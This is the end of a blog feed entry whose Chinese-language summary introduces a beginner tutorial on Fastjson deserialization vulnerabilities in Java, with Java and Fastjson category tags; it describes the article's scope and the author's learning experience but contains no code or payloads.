    <summary type="html">&lt;p&gt;​		我在学习&lt;code&gt;Java&lt;/code&gt;漏洞的时候，感觉很痛苦，不知道从何学起，因为我的&lt;code&gt;Java&lt;/code&gt;基础实在是太烂了，而且网上的关于这方面的文章，要么就给我这个初学者一种高深莫测、没多少基础就没法理解的感觉，要么就是写的实在是太过简略，没有系统性强、通俗易懂、小白友好的文章，于是我决定自己死磕，遇到不会的就去百度、谷歌、问&lt;code&gt;chatgpt&lt;/code&gt;以及问&lt;code&gt;Java&lt;/code&gt;安全大牛师傅们，于是就有了这一系列的文章。&lt;br&gt;​		本文作为&lt;code&gt;Java&lt;/code&gt;安全亲妈级零基础教程的第一篇&lt;code&gt;Fastjson&lt;/code&gt;漏洞的基础篇，从前置知识开始讲起，然后过渡到漏洞的复现和代码的分析，本文除去代码一共近&lt;code&gt;11000&lt;/code&gt;字，配图&lt;code&gt;108&lt;/code&gt;张，配图足够详细清除，跟着复现分析基本可以搞明白这些漏洞是怎么一回事。提高篇会重点研究&lt;code&gt;Fastjson&lt;/code&gt;的其他&lt;code&gt;payload&lt;/code&gt;和&lt;code&gt;Fastjson&lt;/code&gt;的不出网利用上，会在下一次更新。&lt;br&gt;​		我在学习&lt;code&gt;Fastjson&lt;/code&gt;相关漏洞的时候，掌握基础之后再看师傅们的分析文章，常常不由得拍手称快，心里由衷地佩服发现这些利用链的师傅们，利用链是如此的巧妙，和开发者们之间的一攻一防真是让人觉得酣畅淋漓，精彩不觉。在写这系列的文章的时候，我常常能进入到久违的”心流“状态，丝毫感觉不到时间的流逝，版本之间的不同、开发者和白帽子之间对弈的场景与时间轴仿佛就呈现在我的眼前，如同过电影一般，快哉快哉！&lt;br&gt;​		在学习的过程中，我阅读参考了数十篇师傅的文章，这些都被我列在文末，以表感谢。&lt;br&gt;​		本文写作的时候，由于经常熬夜，出错之处在所难免，还望师傅们指出来，我会在下篇文章的开头感谢提出来的师傅们！  &lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://w01fh4cker.github.io/tags/Java/"/>
    
    <category term="Fastjson" scheme="https://w01fh4cker.github.io/tags/Fastjson/"/>
    
  </entry>
  
</feed>
